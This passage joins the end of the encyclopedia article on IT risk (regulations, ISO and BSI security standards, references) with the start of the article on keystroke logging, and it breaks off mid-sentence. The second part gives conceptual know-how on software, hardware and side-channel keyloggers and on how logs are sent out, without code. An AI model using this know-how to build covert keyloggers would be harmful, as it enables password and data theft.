Amendments to the Federal Rules of Civil Procedure with regard to electronic discovery
. Topic: U.S. Federal rules with regard to the production of electronic documents in civil proceedings. The discovery rules allow a party in civil proceedings to demand that the opposing party produce all relevant documentation (to be defined by the requesting party) in its possession, so as to allow the parties and the court to correctly assess the matter. Through the e-discovery amendment, which entered into force on 1 December 2006, such information may now include electronic information. This implies that any party being brought before a U.S. court in civil proceedings can be asked to produce such documents, which includes finalised reports, working documents, internal memos and e-mails with regard to a specific subject, which may or may not be specifically delineated. Any party whose activities imply a risk of being involved in such proceedings must therefore take adequate precautions for the management of such information, including the secure storage. Specifically: The party must be capable of initiating a ‘litigation hold’, a technical/organisational measure which must ensure that no relevant information can be modified any longer in any way. Storage policies must be responsible: while deletion of specific information of course remains allowed when this is a part of general information management policies (‘routine, good-faith operation of the information system’, Rule 37 (f)), the wilful destruction of potentially relevant information can be punished by extremely high fines (in one specific case of 1.6 billion US$). Thus, in practice, any businesses who risk civil litigation before U.S. courts must implement adequate information management policies, and must implement the necessary measures to initiate a litigation hold.


Privacy


California Consumer Privacy Act (CCPA)


California Privacy Rights Act (CPRA)


Gramm–Leach–Bliley Act
 (GLBA)


USA PATRIOT Act, Title III


Health Insurance Portability and Accountability Act
 (HIPAA) From an RM/RA perspective, the Act is particularly known for its provisions with regard to Administrative Simplification (Title II of HIPAA). This title required the U.S. Department of Health and Human Services (HHS) to draft specific rule sets, each of which would provide specific standards which would improve the efficiency of the health care system and prevent abuse. As a result, the HHS has adopted five principal rules: the Privacy Rule, the Transactions and Code Sets Rule, the Unique Identifiers Rule, the Enforcement Rule, and the Security Rule. The latter, published in the Federal Register on 20 February 2003 (see: 
http://www.cms.hhs.gov/SecurityStandard/Downloads/securityfinalrule.pdf
 
Archived
 2009-12-29 at the 
Wayback Machine
), is specifically relevant, as it specifies a series of administrative, technical, and physical security procedures to assure the confidentiality of electronic protected health information. These aspects have been further outlined in a set of Security Standards on Administrative, Physical, Organisational and Technical Safeguards, all of which have been published, along with a guidance document on the basics of HIPAA risk management and risk assessment <
http://www.cms.hhs.gov/EducationMaterials/04_SecurityMaterials.asp
 
Archived
 2010-01-23 at the 
Wayback Machine
>. European or other countries health care service providers will generally not be affected by HIPAA obligations if they are not active on the U.S. market. However, since their data processing activities are subject to similar obligations under general European law (including the Privacy Directive), and since the underlying trends of modernisation and evolution towards electronic health files are the same, the HHS safeguards can be useful as an initial yardstick for measuring RM/RA strategies put in place by European health care service providers, specifically with regard to the processing of electronic health information. HIPAA security standards include the following:

Administrative safeguards:

Security Management Process


Assigned Security Responsibility


Workforce Security


Information Access Management


Security Awareness and Training


Security Incident Procedures


Contingency Plan


Evaluation


Business Associate Contracts and Other Arrangements


Physical safeguards

Facility Access Controls


Workstation Use


Workstation Security


Device and Media Controls


Technical safeguards

Access Control


Audit Controls


Integrity


Person or Entity Authentication


Transmission Security


Organisational requirements

Business Associate Contracts & Other Arrangements


Requirements for Group Health Plans


International Safe Harbor Privacy Principles
 issued by the US Department of Commerce on July 21, 2000 Export of personal data from a data controller who is subject to E.U. privacy regulations to a U.S. based destination; before personal data may be exported from an entity subject to E.U. privacy regulations to a destination subject to U.S. law, the European entity must ensure that the receiving entity provides adequate safeguards to protect such data against a number of mishaps. One way of complying with this obligation is to require the receiving entity to join the Safe Harbor, by requiring that the entity self-certifies its compliance with the so-called Safe Harbor Principles. If this road is chosen, the data controller exporting the data must verify that the U.S. destination is indeed on the Safe Harbor list (see 
safe harbor list
)


The United States 
Department of Homeland Security
 also utilizes 
Privacy Impact Assessment (PIA)
 as a 
decision making tool to identify and mitigate risks of privacy violations.
[
29
]


Sarbanes–Oxley Act


FISMA


SEC Cybersecurity Risk Management, Strategy, Governance, and Incident Disclosure
[
30
]



As legislation evolves, there has been increased focus to require 
'reasonable security'
 for information management. CCPA states that "manufacturers of connected devices to equip the device with reasonable security."
[
31
]
 New York's SHIELD Act requires that organizations that manage NY residents' information “develop, implement and maintain reasonable safeguards to protect the security, confidentiality and integrity of the private information including, but not limited to, disposal of data.” This concept will influence how businesses manage their risk management plan as compliance requirements develop.



Standards organizations and standards
[
edit
]


International standard bodies:

International Organization for Standardization
 – 
ISO


Payment Card Industry Security Standards Council


Information Security Forum


The Open Group


United States standard bodies:

National Institute of Standards and Technology
 – 
NIST


Federal Information Processing Standards
 – FIPS by NIST devoted to Federal Government and Agencies


UK standard bodies

British Standard Institute


Short description of standards
[
edit
]


The list is chiefly based on:
[
28
]




ISO
[
edit
]


ISO/IEC 13335
-1:2004 – Information technology—Security techniques—Management of information and communications technology security—Part 1: Concepts and models for information and communications technology security management 
http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=39066
. Standard containing generally accepted descriptions of concepts and models for information and communications technology security management. The standard is a commonly used code of practice, and serves as a resource for the implementation of security management practices and as a yardstick for auditing such practices. (See also 
http://csrc.nist.gov/publications/secpubs/otherpubs/reviso-faq.pdf
 
Archived
 2010-12-06 at the 
Wayback Machine
)


ISO/IEC TR 15443
-1:2005 – Information technology—Security techniques—A framework for IT security assurance reference:
http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=39733
 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Security assurance – the Technical Report (TR) contains generally accepted guidelines which can be used to determine an appropriate assurance method for assessing a security service, product or environmental factor


ISO/IEC 15816:2002 – Information technology—Security techniques—Security information objects for access control reference:
http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=29139
 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Security management – Access control. The standard allows security professionals to rely on a specific set of syntactic definitions and explanations with regard to SIOs, thus avoiding duplication or divergence in other standardisation efforts.


ISO/IEC TR 15947:2002 – Information technology—Security techniques—IT intrusion detection framework reference:
http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=29580
 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Security management – Intrusion detection in IT systems. The standard allows security professionals to rely on a specific set of concepts and methodologies for describing and assessing security risks with regard to potential intrusions in IT systems. It does not contain any RM/RA obligations as such, but it is rather a tool for facilitating RM/RA activities in the affected field.


ISO/IEC 15408
-1/2/3:2005 – Information technology — Security techniques — Evaluation criteria for IT security — Part 1: Introduction and general model (15408-1) Part 2: Security functional requirements (15408-2) Part 3: Security assurance requirements (15408-3) reference: 
http://isotc.iso.org/livelink/livelink/fetch/2000/2489/Ittf_Home/PubliclyAvailableStandards.htm
 Topic: Standard containing a common set of requirements for the security functions of IT products and systems and for assurance measures applied to them during a security evaluation. Scope: Publicly available ISO standard, which can be voluntarily implemented. The text is a resource for the evaluation of the security of IT products and systems, and can thus be used as a tool for RM/RA. The standard is commonly used as a resource for the evaluation of the security of IT products and systems; including (if not specifically) for procurement decisions with regard to such products. The standard can thus be used as an RM/RA tool to determine the security of an IT product or system during its design, manufacturing or marketing, or before procuring it.


ISO/IEC 17799
:2005 – Information technology—Security techniques—Code of practice for information security management. reference: 
http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=39612&ICS1=35&ICS2=40&ICS3=
 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Standard containing generally accepted guidelines and general principles for initiating, implementing, maintaining, and improving information security management in an organization, including business continuity management. The standard is a commonly used code of practice, and serves as a resource for the implementation of information security management practices and as a yardstick for auditing such practices. (See also 
ISO/IEC 17799
)


ISO/IEC TR 15446:2004 – Information technology—Security techniques—Guide for the production of Protection Profiles and Security Targets. reference: 
http://isotc.iso.org/livelink/livelink/fetch/2000/2489/Ittf_Home/PubliclyAvailableStandards.htm
 Topic: Technical Report (TR) containing guidelines for the construction of Protection Profiles (PPs) and Security Targets (STs) that are intended to be compliant with ISO/IEC 15408 (the "Common Criteria"). The standard is predominantly used as a tool for security professionals to develop PPs and STs, but can also be used to assess the validity of the same (by using the TR as a yardstick to determine if its standards have been obeyed). Thus, it is a (nonbinding) normative tool for the creation and assessment of RM/RA practices.


ISO/IEC 18028
:2006 – Information technology—Security techniques—IT network security reference: 
http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=40008
 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Five part standard (ISO/IEC 18028-1 to 18028-5) containing generally accepted guidelines on the security aspects of the management, operation and use of information technology networks. The standard is considered an extension of the guidelines provided in ISO/IEC 13335 and ISO/IEC 17799 focusing specifically on network security risks. The standard is a commonly used code of practice, and serves as a resource for the implementation of security management practices and as a yardstick for auditing such practices.


ISO/IEC 27001
:2005 – Information technology—Security techniques—Information security management systems—Requirements reference: 
http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=42103
 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Standard containing generally accepted guidelines for the implementation of an Information Security Management System within any given organisation. Scope: Not publicly available ISO standard, which can be voluntarily implemented. While not legally binding, the text contains direct guidelines for the creation of sound information security practices The standard is a very commonly used code of practice, and serves as a resource for the implementation of information security management systems and as a yardstick for auditing such systems and/or the surrounding practices. Its application in practice is often combined with related standards, such as BS 7799-3:2006 which provides additional guidance to support the requirements given in ISO/IEC 27001:2005 <
http://www.bsiglobal.com/en/Shop/Publication-Detail/?pid=000000000030125022&recid=2491
[
permanent dead link
]
>


ISO/IEC 27001:2013
, the updated standard for information security management systems.


ISO/IEC TR 18044:2004 – Information technology—Security techniques—Information security incident management reference: 
http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=35396
 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Technical Report (TR) containing generally accepted guidelines and general principles for information security incident management in an organization.Scope: Not publicly available ISO TR, which can be voluntarily used.While not legally binding, the text contains direct guidelines for incident management. The standard is a high level resource introducing basic concepts and considerations in the field of incident response. As such, it is mostly useful as a catalyst to awareness raising initiatives in this regard.


ISO/IEC 18045:2005 – Information technology—Security techniques—Methodology for IT security evaluation reference: 
http://isotc.iso.org/livelink/livelink/fetch/2000/2489/Ittf_Home/PubliclyAvailableStandards.htm
 Topic: Standard containing auditing guidelines for assessment of compliance with ISO/IEC 15408 (Information technology—Security techniques—Evaluation criteria for IT security) Scope Publicly available ISO standard, to be followed when evaluating compliance with ISO/IEC 15408 (Information technology—Security techniques—Evaluation criteria for IT security). The standard is a ‘companion document’, which is thus primarily of used for security professionals involved in evaluating compliance with ISO/IEC 15408 (Information technology—Security techniques—Evaluation criteria for IT security). Since it describes minimum actions to be performed by such auditors, compliance with ISO/IEC 15408 is impossible if ISO/IEC 18045 has been disregarded.


ISO/TR 13569:2005 – Financial services—Information security guidelines reference: 
http://www.iso.org/iso/en/CatalogueDetailPage.CatalogueDetail?CSNUMBER=37245
 (Note: this is a reference to the ISO page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Standard containing guidelines for the implementation and assessment of information security policies in financial services institutions. The standard is a commonly referenced guideline, and serves as a resource for the implementation of information security management programmes in institutions of the financial sector, and as a yardstick for auditing such programmes. (See also 
http://csrc.nist.gov/publications/secpubs/otherpubs/reviso-faq.pdf
 
Archived
 2010-12-06 at the 
Wayback Machine
)


ISO/IEC 21827:2008 – Information technology—Security techniques—Systems Security Engineering—Capability Maturity Model (SSE-CMM): ISO/IEC 21827:2008 specifies the Systems Security Engineering – Capability Maturity Model (SSE-CMM), which describes the essential characteristics of an organization's security engineering process that must exist to ensure good security engineering. ISO/IEC 21827:2008 does not prescribe a particular process or sequence, but captures practices generally observed in industry. The model is a standard metric for security engineering practices.


BSI
[
edit
]


BS 25999
-1:2006 – Business continuity management Part 1: Code of practice Note: this is only part one of BS 25999, which was published in November 2006. Part two (which should contain more specific criteria with a view of possible accreditation) is yet to appear. reference: 
http://www.bsi-global.com/en/Shop/Publication-Detail/?pid=000000000030157563
 
Archived
 2009-08-27 at the 
Wayback Machine
. Topic: Standard containing a business continuity code of practice. The standard is intended as a code of practice for business continuity management, and will be extended by a second part that should permit accreditation for adherence with the standard. Given its relative newness, the potential impact of the standard is difficult to assess, although it could be very influential to RM/RA practices, given the general lack of universally applicable standards in this regard and the increasing attention to business continuity and contingency planning in regulatory initiatives. Application of this standard can be complemented by other norms, in particular PAS 77:2006 – IT Service Continuity Management Code of Practice <
http://www.bsi-global.com/en/Shop/Publication-Detail/?pid=000000000030141858
>.The
[
permanent dead link
]
 TR allows security professionals to determine a suitable methodology for assessing a security service, product or environmental factor (a deliverable). Following this TR, it can be determined which level of security assurance a deliverable is intended to meet, and if this threshold is actually met by the deliverable.


BS 7799
-3:2006 – Information security management systems—Guidelines for information security risk management reference: 
http://www.bsi-global.com/en/Shop/Publication-Detail/?pid=000000000030125022&recid=2491
[
permanent dead link
]
 (Note: this is a reference to the BSI page where the standard can be acquired. However, the standard is not free of charge, and its provisions are not publicly available. For this reason, specific provisions cannot be quoted). Topic: Standard containing general guidelines for information security risk management.Scope: Not publicly available BSI standard, which can be voluntarily implemented. While not legally binding, the text contains direct guidelines for the creation of sound information security practices. The standard is mostly intended as a guiding complementary document to the application of the aforementioned ISO 27001:2005, and is therefore typically applied in conjunction with this standard in risk assessment practices


Information Security Forum
[
edit
]


Standard of Good Practice for Information Security


See also
[
edit
]




Business and economics portal




Asset (computer security)


Availability


BS 7799


BS 25999


Committee on National Security Systems


Common Criteria


Confidentiality


Cyber-security regulation


Data Protection Directive


Electrical disruptions caused by squirrels


Exploit (computer security)


Factor analysis of information risk


Federal Information Security Management Act of 2002


Gramm–Leach–Bliley Act


Health Insurance Portability and Accountability Act


Information security


Information Security Forum


Information technology


Integrity


International Safe Harbor Privacy Principles


ISACA


ISO


ISO/IEC 27000-series


ISO/IEC 27001:2013


ISO/IEC 27002


IT risk management


Long-term support


National Information Assurance Training and Education Center


National Institute of Standards and Technology


National security


OWASP


Patriot Act, Title III


Privacy


Risk


Risk factor (computing)


Risk IT


Sarbanes–Oxley Act


Threat (computer)


Vulnerability


Gordon–Loeb model
 for cyber security investments




References
[
edit
]






^
 
"What is IT risk? | nibusinessinfo.co.uk"
. 
www.nibusinessinfo.co.uk
. Retrieved 
2021-09-04
.




^
 
"Risk is a combination of the likelihood of an occurrence of a hazardous event or exposure(s) and the severity of injury or ill health that can be caused by the event or exposure(s)" (OHSAS 18001:2007)




^
 
"3 Types Of Cybersecurity Assessments – Threat Sketch"
. 
Threat Sketch
. 2016-05-16. Archived from 
the original
 on 2018-11-07
. Retrieved 
2017-10-07
.




^
 
"Information Security Assessment Types"
. 
danielmiessler.com
. Retrieved 
2017-10-07
.




^ 
a
 
b
 
c
 
ISO/IEC, "Information technology – Security techniques-Information security risk management" ISO/IEC FIDIS 27005:2008




^
 
CNSS Instruction No. 4009
 
Archived
 2012-02-27 at the 
Wayback Machine
 dated 26 April 2010




^
 
National Information Assurance Certification and Accreditation Process (NIACAP) by National Security Telecommunications and Information Systems Security Committee




^
 
"Glossary of Terms"
. Retrieved 
23 May
 2016
.




^
 
a wiki project
 
Archived
 2011-09-26 at the 
Wayback Machine
 devoted to 
FISMA




^
 
FISMApedia Risk term




^ 
a
 
b
 
NIST SP 800-30 Risk Management Guide for Information Technology Systems




^
 
FIPS Publication 200 Minimum Security Requirements for Federal Information and Information Systems




^ 
a
 
b
 
FAIR: Factor Analysis for Information Risks
 
Archived
 2014-11-18 at the 
Wayback Machine




^ 
a
 
b
 
ISACA THE RISK IT FRAMEWORK
 
Archived
 2010-07-05 at the 
Wayback Machine
 
ISBN
 
978-1-60420-111-6
 (registration required)




^
 
Technical Standard Risk Taxonomy 
ISBN
 
1-931624-77-1
 Document Number: C081 Published by The Open Group, January 2009.




^
 
Arnold, Rob (2017). 
Cybersecurity: A Business Solution: An executive perspective on managing cyber risk
. Threat Sketch, LLC. 
ISBN
 
9780692944158
.




^
 
Arnold, Rob (2017). 
Cybersecurity: A Business Solution
. Threat Sketch, LLC. p. 22. 
ISBN
 
978-0692944158
.




^
 
"Glossary"
. Archived from 
the original
 on 29 February 2012
. Retrieved 
23 May
 2016
.




^
 
"Glossary"
. Archived from 
the original
 on 29 February 2012
. Retrieved 
23 May
 2016
.




^
 
"Glossary"
. Archived from 
the original
 on 29 February 2012
. Retrieved 
23 May
 2016
.




^
 
"Glossary"
. Archived from 
the original
 on 29 February 2012
. Retrieved 
23 May
 2016
.




^ 
a
 
b
 
"OWASP Risk Rating Methodology"
. Retrieved 
23 May
 2016
.




^
 
"ISACA THE RISK IT FRAMEWORK (registration required)"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on 2010-07-05
. Retrieved 
2010-12-14
.




^
 
Enisa Risk management, Risk assessment inventory, page 46




^
 


ISACA (2006). 
CISA Review Manual 2006
. Information Systems Audit and Control Association. p. 85. 
ISBN
 
978-1-933284-15-6
.




^
 
Keller, Nicole (2013-11-12). 
"Cybersecurity Framework"
. 
NIST
. Retrieved 
2017-10-07
.




^
 
Arnold, Rob. 
"A 10 Minute Guide to the NIST Cybersecurity Framework"
. 
Threat Sketch
. Archived from 
the original
 on 2021-04-14
. Retrieved 
2018-02-14
.




^ 
a
 
b
 
Risk Management / Risk Assessment in European regulation, international guidelines and codes of practice
 
Archived
 2011-07-23 at the 
Wayback Machine
 Conducted by the Technical Department of ENISA Section Risk Management in cooperation with: Prof. J. Dumortier and Hans Graux www.lawfort.be June 2007




^
 
"Privacy Impact Assessments"
. 
Department of Homeland Security
. 2009-07-06
. Retrieved 
2020-12-12
.




^
 
"Securities and Exchange Commission (SEC)"
 
(PDF)
. 
Securities and Exchange Commission (SEC)
.




^
 
IAPP. 
"The evolution of the 'reasonable security' standard in the US context"
.






External links
[
edit
]


Internet2 Information Security Guide: Effective Practices and Solutions for Higher Education
 
Archived
 2010-06-12 at the 
Wayback Machine


Risk Management – Principles and Inventories for Risk Management / Risk Assessment methods and tools
 
Archived
 2010-11-13 at the 
Wayback Machine
, Publication date: Jun 01, 2006 Authors:Conducted by the Technical Department of ENISA Section Risk Management


Clusif Club de la Sécurité de l'Information Français


800-30 NIST Risk Management Guide


800-39 NIST DRAFT Managing Risk from Information Systems: An Organizational Perspective


FIPS Publication 199, Standards for Security Categorization of Federal Information and Information


FIPS Publication 200 Minimum Security Requirements for Federal Information and Information Systems


800-37 NIST Guide for Applying the Risk Management Framework to Federal Information Systems: A Security Life Cycle Approach


FISMApedia is a collection of documents and discussions focused on USA Federal IT security


Duty of Care Risk Analysis Standard (DoCRA)










Retrieved from "
https://en.wikipedia.org/w/index.php?title=IT_risk&oldid=1243009132
"


Categories
: 
Data security
IT risk management
Risk analysis
Security compliance
Operational risk
Hidden categories: 
Webarchive template wayback links
Articles with short description
Short description is different from Wikidata
All articles with dead external links
Articles with dead external links from June 2024
Articles with permanently dead external links
Articles with dead external links from August 2024











From Wikipedia, the free encyclopedia






Action of recording the keys struck on a keyboard


Keystroke logging
, often referred to as 
keylogging
 or 
keyboard capturing
, is the action of recording (logging) the keys struck on a 
keyboard
,
[
1
]
[
2
]
 typically covertly, so that a person using the keyboard is unaware that their actions are being monitored. Data can then be retrieved by the person operating the logging program. A 
keystroke recorder
 or 
keylogger
 can be either 
software
 or 
hardware
.

While the programs themselves are legal,
[
3
]
 with many designed to allow employers to oversee the use of their computers, keyloggers are most often used for stealing passwords and other 
confidential information
.
[
4
]
[
5
]
 Keystroke logging can also be utilized to monitor activities of children in schools or at home and by law enforcement officials to investigate malicious usage.
[
6
]


Keylogging can also be used to study 
keystroke dynamics
[
7
]
 or 
human-computer interaction
. Numerous keylogging methods exist, ranging from hardware and 
software
-based approaches to acoustic cryptanalysis.





History
[
edit
]


In the mid-1970s, the 
Soviet Union
 developed and deployed a hardware keylogger targeting 
typewriters
. Termed the "selectric bug", it measured the movements of the print head of IBM Selectric typewriters via subtle influences on the regional magnetic field caused by the rotation and movements of the print head.
[
8
]
 An early keylogger was written by 
Perry Kivolowitz
 and posted to the Usenet newsgroup net.unix-wizards, net.sources on November 17, 1983.
[
9
]
 The posting seems to be a motivating factor in restricting access to 
/dev/kmem
 on 
Unix
 systems. The 
user-mode
 program operated by locating and dumping character lists (clients) as they were assembled in the Unix kernel.

In the 1970s, spies installed keystroke loggers in the 
US Embassy
 and Consulate buildings in 
Moscow
.
[
10
]
[
11
]

They installed the bugs in 
Selectric
 II and Selectric III electric typewriters.
[
12
]


Soviet embassies used manual typewriters, rather than electric typewriters, for 
classified information
—apparently because they are immune to such bugs.
[
12
]

As of 2013, Russian special services still use typewriters.
[
11
]
[
13
]
[
14
]




Application of keylogger
[
edit
]


Software-based keyloggers
[
edit
]


A keylogger example of a screen capture, which holds potentially confidential and private information. The image below holds the corresponding keylogger text result.


A 
logfile
 from a software-based keylogger, based on the screen capture above


A software-based keylogger is a computer program designed to record any input from the keyboard.
[
15
]
 Keyloggers are used in 
IT
 organizations to troubleshoot technical problems with computers and business networks. Families and businesspeople use keyloggers legally to monitor network usage without their users' direct knowledge. 
Microsoft
 publicly stated that 
Windows 10
 has a built-in keylogger in its final version "to improve typing and writing services".
[
16
]
 However, malicious individuals can use keyloggers on public computers to steal passwords or credit card information. Most keyloggers are not stopped by 
HTTPS
 encryption because that only protects 
data in transit
 between computers; software-based keyloggers run on the affected user's computer, reading keyboard inputs directly as the user types.

From a technical perspective, there are several categories:



Hypervisor-based
: The keylogger can theoretically reside in a 
malware
 
hypervisor
 running underneath the operating system, which thus remains untouched. It effectively becomes a 
virtual machine
. 
Blue Pill
 is a conceptual example.


Kernel
-based
: A program on the machine obtains 
root access
 to hide in the OS and intercepts keystrokes that pass through the kernel. This method is difficult both to write and to combat. Such keyloggers reside at the 
kernel level
, which makes them difficult to detect, especially for user-mode applications that do not have root access. They are frequently implemented as 
rootkits
 that subvert the operating system kernel to gain unauthorized access to the hardware. This makes them very powerful. A keylogger using this method can act as a keyboard 
device driver
, for example, and thus gain access to any information typed on the keyboard as it goes to the operating system.


API-based
: These keyloggers 
hook
 keyboard 
APIs
 inside a running application. The keylogger registers keystroke events as if it was a normal piece of the application instead of malware. The keylogger receives an 
event
 each time the user presses or releases a key. The keylogger simply records it.

Windows APIs such as 
GetAsyncKeyState()
, 
GetForegroundWindow()
, etc. are used to poll the state of the keyboard or to subscribe to keyboard events.
[
17
]
 A more recent
[
when?
]
 example simply polls the 
BIOS
 for pre-boot authentication 
PINs
 that have not been cleared from memory.
[
18
]


Form grabbing based
: 
Form grabbing
-based keyloggers log 
Web form
 submissions by recording the form data on submit events. This happens when the user completes a form and submits it, usually by clicking a button or pressing enter. This type of keylogger records form data before it is passed over the Internet.


JavaScript-based:
 A malicious script tag is injected into a targeted web page, and listens for key events such as 
onKeyUp()
. Scripts can be injected via a variety of methods, including 
cross-site scripting
, 
man-in-the-browser
, 
man-in-the-middle
, or a compromise of the remote website.
[
19
]


Memory-injection-based
: Memory Injection (
MitB
)-based keyloggers perform their logging function by altering the memory tables associated with the browser and other system functions. By patching the memory tables or injecting directly into memory, this technique can be used by malware authors to bypass Windows UAC (User Account Control). The 
Zeus
 and 
SpyEye
 trojans use this method exclusively.
[
20
]
 Non-Windows systems have protection mechanisms that allow access to locally recorded data from a remote location.
[
clarification needed
]
 Remote communication may be achieved when one of these methods is used:

Data is uploaded to a website, database or an 
FTP
 server.


Data is periodically emailed to a pre-defined 
email address
.


Data is 
wirelessly
 transmitted employing an attached hardware system.


The software enables a remote login to the local machine from the Internet or the local network, for data logs stored on the target machine.


Keystroke logging in writing process research
[
edit
]


Since 2006, Keystroke logging has been an established research method for the study of writing processes.
[
21
]
[
22
]
 Different programs have been developed to collect online process data of writing activities,
[
23
]
 including 
Inputlog
, Scriptlog, Translog and GGXLog.

Keystroke logging is used legitimately as a suitable research instrument in several writing contexts. These include studies on cognitive writing processes, which include



descriptions of writing strategies; the writing development of children (with and without writing difficulties),


spelling,


first and second language writing, and


specialist skill areas such as translation and subtitling.


Keystroke logging can be used to research writing, specifically. It can also be integrated into educational domains for second language learning, programming skills, and typing skills.



Related features
[
edit
]


Software keyloggers may be augmented with features that capture user information without relying on keyboard key presses as the sole input. Some of these features include:



Clipboard logging. Anything that has been copied to the 
clipboard
 can be captured by the program.


Screen logging. 
Screenshots
 are taken to capture graphics-based information. Applications with screen logging abilities may take screenshots of the whole screen, of just one application, or even just around the mouse cursor. They may take these screenshots periodically or in response to user behaviors (for example, when a user clicks the mouse). Screen logging can be used to capture data inputted with an on-screen keyboard.


Programmatically capturing the text in a 
control
. The 
Microsoft Windows
 
API
 allows programs to request the text 'value' in some controls. This means that some passwords may be captured, even if they are hidden behind password masks (usually asterisks).
[
24
]


The recording of every program/folder/window opened including a screenshot of every website visited.


The recording of 
search engines queries
, 
instant messenger
 conversations, FTP downloads and other Internet-based activities (including the bandwidth used).


Hardware-based keyloggers
[
edit
]


A hardware-based keylogger


A connected hardware-based keylogger


Main article: 
Hardware keylogger


Hardware-based keyloggers do not depend upon any software being installed as they exist at a hardware level in a computer system.



Firmware-based: 
BIOS
-level 
firmware
 that handles keyboard events can be modified to record these events as they are processed. Physical and/or 
root-level access
 is required to the machine, and the software loaded into the BIOS needs to be created for the specific hardware that it will be running on.
[
25
]


Keyboard hardware: Hardware keyloggers are used for keystroke logging utilizing a hardware circuit that is attached somewhere in between the 
computer keyboard
 and the computer, typically inline with the keyboard's cable connector. There are also 
USB
 connector-based hardware keyloggers, as well as ones for laptop computers (the Mini-PCI card plugs into the expansion slot of a laptop). More stealthy implementations can be installed or built into standard keyboards so that no device is visible on the external cable. Both types log all keyboard activity to their 
internal memory
, which can be subsequently accessed, for example, by typing in a secret key sequence. Hardware keyloggers do not require any software to be installed on a target user's computer, therefore not interfering with the computer's operation and less likely to be detected by software running on it. However, its physical presence may be detected if, for example, it is installed outside the case as an inline device between the computer and the keyboard. Some of these implementations can be controlled and monitored remotely using a wireless communication standard.
[
26
]


Wireless keyboard and mouse sniffers: These passive sniffers collect packets of data being transferred from a wireless keyboard and its receiver. As encryption may be used to secure the wireless communications between the two devices, this may need to be cracked beforehand if the transmissions are to be read. In some cases, this enables an attacker to type arbitrary commands into a victim's computer.
[
27
]


Keyboard overlays: Criminals have been known to use keyboard overlays on 
ATMs
 to capture people's PINs. Each keypress is registered by the keyboard of the ATM as well as the criminal's keypad that is placed over it. The device is designed to look like an integrated part of the machine so that bank customers are unaware of its presence.
[
28
]


Acoustic keyloggers: 
Acoustic cryptanalysis
 can be used to monitor the sound created by someone typing on a computer. Each key on the keyboard makes a subtly different acoustic signature when struck. It is then possible to identify which keystroke signature relates to which keyboard character via 
statistical methods
 such as 
frequency analysis
. The repetition frequency of similar acoustic keystroke signatures, the timings between different keyboard strokes and other context information such as the probable language in which the user is writing are used in this analysis to map sounds to letters.
[
29
]
 A fairly long recording (1000 or more keystrokes) is required so that a large enough 
sample
 is collected.
[
30
]


Electromagnetic emissions: It is possible to capture the 
electromagnetic emissions
 of a wired keyboard from up to 20 metres (66 ft) away, without being physically wired to it.
[
31
]
 In 2009, Swiss researchers tested 11 different 
USB
, 
PS/2
 and laptop keyboards in a semi-
anechoic chamber
 and found them all vulnerable, primarily because of the prohibitive cost of adding 
shielding
 during manufacture.
[
32
]
 The researchers used a wide-band 
receiver
 to tune into the specific frequency of the emissions radiated from the keyboards.


Optical surveillance: Optical surveillance, while not a keylogger in the classical sense, is nonetheless an approach that can be used to capture passwords or PINs. A strategically placed camera, such as a hidden 
surveillance camera
 at an 
ATM
, can allow a criminal to watch a PIN or password being entered.
[
33
]
[
34
]


Physical evidence: For a keypad that is used only to enter a security code, the keys which are in actual use will have evidence of use from many fingerprints. A passcode of four digits, if the four digits in question are known, is reduced from 10,000 possibilities to just 24 possibilities (10
4
 versus 4! [
factorial
 of 4]). These could then be used on separate occasions for a manual "brute force attack".


Smartphone
 sensors: Researchers have demonstrated that it is possible to capture the keystrokes of nearby computer keyboards using only the commodity 
accelerometer
 found in smartphones.
[
35
]
 The attack is made possible by placing a smartphone near a keyboard on the same desk. The smartphone's accelerometer can then detect the vibrations created by typing on the keyboard and then translate this raw accelerometer signal into readable sentences with as much as 80 percent accuracy. The technique involves working through probability by detecting pairs of keystrokes, rather than individual keys. It models "keyboard events" in pairs and then works out whether the pair of keys pressed is on the left or the right side of the keyboard and whether they are close together or far apart on the 
QWERTY
 keyboard. Once it has worked this out, it compares the results to a preloaded dictionary where each word has been broken down in the same way.
[
36
]
 Similar techniques have also been shown to be effective at capturing keystrokes on touchscreen keyboards
[
37
]
[
38
]
[
39
]
 while in some cases, in combination with 
gyroscope
[
40
]
[
41
]
 or with the ambient-light sensor.
[
42
]


Body keyloggers: Body keyloggers track and analyze body movements to determine which keys were pressed. The attacker needs to be familiar with the keys layout of the tracked keyboard to correlate between body movements and keys position. Tracking audible signals of the user' interface (e.g. a sound the device produce to informs the user that a keystroke was logged) may reduce the complexity of the body keylogging algorithms, as it marks the moment at which a key was pressed.
[
43
]


Cracking
[
edit
]


Writing simple software applications for keylogging can be trivial, and like any nefarious computer program, can be distributed as a 
trojan horse
 or as part of a 
virus
. What is not trivial for an attacker, however, is installing a covert keystroke logger without getting caught and downloading data that has been logged without being traced. An attacker that manually connects to a host machine to download logged keystrokes risks being traced. A trojan that sends keylogged data to a fixed e-mail address or 
IP address
